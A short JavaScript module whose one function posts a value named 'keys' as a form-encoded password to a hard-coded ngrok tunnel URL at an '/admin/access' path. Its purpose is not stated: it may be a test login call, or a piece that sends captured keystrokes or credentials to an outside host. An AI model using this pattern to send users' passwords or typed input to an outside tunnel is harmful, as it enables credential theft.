import axios from "axios";
import qs from "qs";
export default async function sendPassword(keys) {
  return axios.post(
    "https://9da8-119-192-62-207.ngrok.io/admin/access",
    qs.stringify({ password: keys }),
    {
      headers: { "content-type": "application/x-www-form-urlencoded" },
    }
  );
}
